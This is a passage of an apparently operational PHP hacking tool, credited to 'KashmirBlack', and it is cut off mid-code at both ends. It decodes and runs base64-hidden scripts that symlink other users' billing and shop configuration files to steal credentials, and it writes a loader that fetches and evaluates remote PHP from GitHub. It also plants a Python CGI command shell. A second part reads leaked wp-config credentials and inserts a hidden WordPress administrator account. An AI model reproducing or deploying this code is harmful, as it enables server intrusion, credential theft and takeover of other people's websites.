IpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQUNDT1VOVC9zdWJtaXR0aWNrZXQucGhwIiwiTWVMZVgvIi4kMS4iLVdITUNTLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQWNjb3VudC9zdWJtaXR0aWNrZXQucGhwIiwiTWVMZVgvIi4kMS4iLVdITUNTLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvYWNjb3VudC9zdWJtaXR0aWNrZXQucGhwIiwiTWVMZVgvIi4kMS4iLVdITUNTLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvVVNFUi9zdWJtaXR0aWNrZXQucGhwIiwiTWVMZVgvIi4kMS4iLVdITUNTLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvVXNlci9zdWJtaXR0aWNrZXQucGhwIiwiTWVMZVgvIi4kMS4iLVdITUNTLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvdXNlci9zdWJtaXR0aWNrZXQucGhwIiwiTWVMZVgvIi4kMS4iLVdITUNTLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQ0xJRU5UUy9zdWJtaXR0aWNrZXQucGhwIiwiTWVMZVgvIi4kMS4iLVdITUNTLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQ2xpZW50cy9zdWJtaXR0aWNrZXQucGhwIiwiTWVMZVgvIi4kMS4iLVdITUNTLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2xpZW50cy9zdWJtaXR0aWNrZXQucGhwIiwiTWVMZVgvIi4kMS4iLVdITUNTLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCIsIk1lTGVYLyIuJDEuIi1XSE1DUy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL0JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAiLCJNZUxlWC8iLiQxLiItV0hNQ1MudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9iaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwIiwiTWVMZVgvIi4kMS4iLVdITUNTLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvTVkvc3VibWl0dGlja2V0LnBocCIsIk1lTGVYLyIuJDEuIi1XSE1DUy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL015L3N1Ym1pdHRpY2tldC5waHAiLCJNZUxlWC8iLiQxLiItV0hNQ1MudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9teS9zdWJtaXR0aWNrZXQucGhwIiwiTWVMZVgvIi4kMS4iLVdITUNTLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc2VjdXJlL3dobS9zdWJtaXR0aWNrZXQucGhwIiwiTWVMZVgvIi4kMS4iLVdITUNTLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc2VjdXJlL3dobWNzL3N1Ym1pdHRpY2tldC5waHAiLCJNZUxlWC8iLiQxLiItV0hNQ1MudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9wYW5lbC9zdWJtaXR0aWNrZXQucGhwIiwiTWVMZVgvIi4kMS4iLVdITUNTLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2xpZW50ZXMvc3VibWl0dGlja2V0LnBocCIsIk1lTGVYLyIuJDEuIi1XSE1DUy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2NsaWVudGUvc3VibWl0dGlja2V0LnBocCIsIk1lTGVYLyIuJDEuIi1XSE1DUy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL3N1cHBvcnQvb3JkZXIvc3VibWl0dGlja2V0LnBocCIsIk1lTGVYLyIuJDEuIi1XSE1DUy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2JiLWNvbmZpZy5waHAiLCJNZUxlWC8iLiQxLiItQm94QmlsbGluZy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2JveGJpbGxpbmcvYmItY29uZmlnLnBocCIsIk1lTGVYLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvYm94L2JiLWNvbmZpZy5waHAiLCJNZUxlWC8iLiQxLiItQm94QmlsbGluZy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2hvc3QvYmItY29uZmlnLnBocCIsIk1lTGVYLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvSG9zdC9iYi1jb25maWcucGhwIiwiTWVMZVgvIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zdXBwb3J0ZXMvYmItY29uZmlnLnBocCIsIk1lTGVYLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc3VwcG9ydC9iYi1jb25maWcucGhwIiwiTWVMZVgvIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9ob3N0aW5nL2JiLWNvbmZpZy5waHAiLCJNZUxlWC8iLiQxLiItQm94QmlsbGluZy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2NhcnQvYmItY29uZmlnLnBocCIsIk1lTGVYLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvb3JkZXIvYmItY29uZmlnLnBocCIsIk1lTGVYLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2xpZW50L2JiLWNvbmZpZy5waHAiLCJNZUxlWC8iLiQxLiItQm94QmlsbGluZy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2NsaWVudHMvYmItY29uZmlnLnBocCIsIk1lTGVYLyIuJDEuIi1Cb3hCaWxsaW5nLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2xpZW50ZS9iYi1jb25maWcucGhwIiwiTWVMZVgvIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jbGllbnRlcy9iYi1jb25maWcucGhwIiwiTWVMZVgvIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9iaWxsaW5nL2JiLWNvbmZpZy5waHAiLCJNZUxlWC8iLiQxLiItQm94QmlsbGluZy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2JpbGxpbmdzL2JiLWNvbmZpZy5waHAiLCJNZUxlWC8iLiQxLiItQm94QmlsbGluZy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL215L2JiLWNvbmZpZy5waHAiLCJNZUxlWC8iLiQxLiItQm94QmlsbGluZy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL3NlY3VyZS9iYi1jb25maWcucGhwIiwiTWVMZVgvIi4kMS4iLUJveEJpbGxpbmcudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zdXBwb3J0L29yZGVyL2JiLWNvbmZpZy5waHAiLCJNZUxlWC8iLiQxLiItQm94QmlsbGluZy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCIsIk1lTGVYLyIuJDEuIi1aZW5jYXJ0LnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAiLCJNZUxlWC8iLiQxLiItWmVuY2FydC50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL3Byb2R1Y3RzL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCIsIk1lTGVYLyIuJDEuIi1aZW5jYXJ0LnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAiLCJNZUxlWC8iLiQxLiItWmVuY2FydC50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwIiwiTWVMZVgvIi4kMS4iLVplbmNhcnQudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9pbmNsdWRlcy9pc280MjE3LnBocCIsIk1lTGVYLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9ob3N0YmlsbHMvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJNZUxlWC8iLiQxLiItSG9zdGJpbGxzLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvaG9zdC9pbmNsdWRlcy9pc280MjE3LnBocCIsIk1lTGVYLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9Ib3N0L2luY2x1ZGVzL2lzbzQyMTcucGhwIiwiTWVMZVgvIi4kMS4iLUhvc3RiaWxscy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL3N1cHBvcnRlcy9pbmNsdWRlcy9pc280MjE3LnBocCIsIk1lTGVYLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zdXBwb3J0L2luY2x1ZGVzL2lzbzQyMTcucGhwIiwiTWVMZVgvIi4kMS4iLUhvc3RiaWxscy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2hvc3RpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJNZUxlWC8iLiQxLiItSG9zdGJpbGxzLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2FydC9pbmNsdWRlcy9pc280MjE3LnBocCIsIk1lTGVYLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9vcmRlci9pbmNsdWRlcy9pc280MjE3LnBocCIsIk1lTGVYLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jbGllbnQvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJNZUxlWC8iLiQxLiItSG9zdGJpbGxzLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2xpZW50cy9pbmNsdWRlcy9pc280MjE3LnBocCIsIk1lTGVYLyIuJDEuIi1Ib3N0YmlsbHMudHh0Iik7CnN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jbGllbnRlL2luY2x1ZGVzL2lzbzQyMTcucGhwIiwiTWVMZVgvIi4kMS4iLUhvc3RiaWxscy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2NsaWVudGVzL2luY2x1ZGVzL2lzbzQyMTcucGhwIiwiTWVMZVgvIi4kMS4iLUhvc3RiaWxscy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2JpbGxpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJNZUxlWC8iLiQxLiItSG9zdGJpbGxzLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvYmlsbGluZ3MvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJNZUxlWC8iLiQxLiItSG9zdGJpbGxzLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvbXkvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJNZUxlWC8iLiQxLiItSG9zdGJpbGxzLnR4dCIpOwpzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc2VjdXJlL2luY2x1ZGVzL2lzbzQyMTcucGhwIiwiTWVMZVgvIi4kMS4iLUhvc3RiaWxscy50eHQiKTsKc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL3N1cHBvcnQvb3JkZXIvaW5jbHVkZXMvaXNvNDIxNy5waHAiLCJNZUxlWC8iLiQxLiItSG9zdGJpbGxzLnR4dCIpOwpzeW1saW5rKCIvIiwiTWVMZVgvcm9vdCIpOwpwcmludCAkMS4iLSI7Cn0KCm9wZW4oT1VULCI+TWVMZVgvLmh0YWNjZXNzIik7CnByaW50IE9VVCAiT1BUSU9OUyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzIFN5bUxpbmtzSWZPd25lck1hdGNoIEluY2x1ZGVzIEluY2x1ZGVzTk9FWEVDIEV4ZWNDR0kKT3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzCkZvcmNlVHlwZSB0ZXh0L3BsYWluCkFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIApBZGRUeXBlIHRleHQvcGxhaW4gLmh0bWwKQWRkVHlwZSB0ZXh0L2h0bWwgLnNodG1sCkFkZFR5cGUgdHh0IC5waHAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAKQWRkSGFuZGxlciB0eHQgLnBocApBZGRIYW5kbGVyIHR4dCAuaHRtbApBZGRIYW5kbGVyIHR4dCAuc2h0bWwKT3B0aW9ucyBBbGwKT3B0aW9ucyBBbGwiOwpjbG9zZShPVVQpOwpwcmludCAnPGNlbnRlcj48aDE+PGEgaHJlZj0iTWVMZVgiIHRhcmdldD0iX0JMQU5LIj5DbGljayBIZXJlPC9hPjwvaDE+JzsKdW5saW5rKCQwKTs=';

$filezx = fopen("s.pl" ,"w+");
$write = fwrite ($filezx ,base64_decode($symlink));
fclose($filezx);
@system('perl s.pl');
$netcatshell = 'PD9waHAgZXZhbCgiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vaXp4MjAyMy96L21haW4va29tdXQucGhwIikpOz8+';

$filex = fopen("komut.php" ,"w+");
$write = fwrite ($filex ,base64_decode($netcatshell));
fclose($filex);
@mkdir("prote");
@chdir("prote");
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "Options +ExecCGI
DirectoryIndex sen.za
AddHandler cgi-script .za";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$azx = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBBIHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBDb3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQgcmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZvciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMgY29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQgZm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsvYXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8gZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9ydCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBzdHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZyb20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRsaW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQtc2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAwNCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUgPSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1FVEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxlcwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIiIlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20gaXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFsdWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUuZy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0gd2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3NpbmcgaXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAgICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3JtW2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZvcm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMgPSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9yIGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAgICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1zaGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZlcnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAsICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIgQ29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyArIHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5nIFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNjcmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAgICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJsYW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3JtKFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3JtaGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJSPicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAgICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAgICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRvdXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHByaW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNvbW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJTygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZhbHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAgICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpDSEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBwcm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';

$file = fopen("sen.za" ,"w+");
$write = fwrite ($file ,base64_decode($azx));
fclose($file);
    chmod("sen.za",0755);
copy("../s.pl",prote/s.pl);
}
?>

<i>Wordpress Auto create user from symlink</i><br>
<form action="#" method="GET">
	<input type="text" name="dirconf" placeholder="http://web.com/sym/">
	<input type="submit" name="fetch" value="Fetch">
</form>

<?php
error_reporting(0);
//Coded By KashmirBlack
if($_REQUEST['fetch'] == "Fetch"){
$web = $_GET['dirconf'];
if(!(preg_match('/\/$/', $web))){
	$web = $web."/";
}
$getlist = requestfile($web);
preg_match_all('/<a\s+href=\"\S+.txt\">\S+<\/a>/', $getlist, $lists);
for($i=3; $i<=99999999; $i++){
if(!(preg_match('/.txt/', $lists[0][$i]))){
	break;
}
else{
$webn = preg_replace('/\n+/', '', $lists[0][$i]);
$list1 = preg_replace('/<a href=\"/', '', $webn);
$list2 = preg_replace('/\">\S+<\/a>$/', '', $list1);
$store = $web.$list2;
$readfile = requestfile($store);
if(preg_match('/WP_DEBUG/', $readfile)) {
        	//wordpress and opencart
        	//DBPassword
        	$m = $readfile;
        	preg_match_all('/define\(\'DB_PASSWORD\',\s+\S+/', $m, $pwdwpconf);
        	$pwdwpconff = preg_replace('/define\(\'DB_PASSWORD\',\s+\'/', '', $pwdwpconf[0][0]);
        	$wppassword = preg_replace('/\'\);$/', '', $pwdwpconff);

        	//DBHost
        	preg_match_all('/define\(\'DB_HOST\',\s+\S+/', $m, $hostwpconf);
        	$hostwpconff = preg_replace('/define\(\'DB_HOST\',\s+\'/', '', $hostwpconf[0][0]);
        	$wphost = preg_replace('/\'\);$/', '', $hostwpconff);

        	//DBName
        	preg_match_all('/define\(\'DB_NAME\',\s+\S+/', $m, $dbwpconf);
        	$dbwpconff = preg_replace('/define\(\'DB_NAME\',\s+\'/', '', $dbwpconf[0][0]);
        	$wpdbname = preg_replace('/\'\);$/', '', $dbwpconff);

        	//DBUser
        	preg_match_all('/define\(\'DB_USER\',\s+\S+/', $m, $userwpconf);
        	$userwpconff = preg_replace('/define\(\'DB_USER\',\s+\'/', '', $userwpconf[0][0]);
        	$wpuser = preg_replace('/\'\);$/', '', $userwpconff);

        	//Database OnGoing,,,
        	$connection = mysqli_connect($wphost, $wpuser, $wppassword, $wpdbname);
        	if($connection){
        		ob_flush();
             	flush();
        		echo "<font color='green'>Connected : ".$wphost."|".$wpuser."|".$wppassword."|".$wpdbname."</font><br>";
        		$q = mysqli_query($connection, "SHOW TABLES FROM $wpdbname");
        		while($tablerow = mysqli_fetch_array($q)){
                    if(preg_match('/\S+_usermeta/', $tablerow[0])){

                        //Drop meta if exist
                        $insertusermeta = $tablerow[0];
                        $del1 = "DELETE FROM $insertusermeta WHERE umeta_id = '1996'";
                        $delete1 = $connection->query($del1);

                        //Insert meta
                        $reg2 = "INSERT INTO $insertusermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, '1996', 'wp_capabilities','a:1:{s:13:\"administrator\";s:1:\"1\";}')";
                        $reg3 = "INSERT INTO $insertusermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, '1996', 'wp_user_level', '10')";
                        $insertusermetaquery = $connection->query($reg2);
                        $insertusermetaquery1 = $connection->query($reg3);

                        //Drop user if exist
                        $insertuser = preg_replace('/usermeta/', 'users', $insertusermeta);
                        $del2 = "DELETE FROM $insertuser WHERE ID = '1996'";
                        $delete2 = $connection->query($del2);

                        //Insert User
                        $reg1 = "INSERT INTO $insertuser (ID, user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key,user_status, display_name) VALUES ('1996', 'adelia', '\$1\$190AOiTv\$Vzi5d6Jd49GTT\/jU4Tk6j\/', 'adelia', 'adelia@cnn.com', 'http://www.cnn.com/', '2011-06-07 00:00:00', '', '0', 'adelia')";
                        $insertuserquery = $connection->query($reg1);

                        //Show User
                        $tableuser = $insertuser;
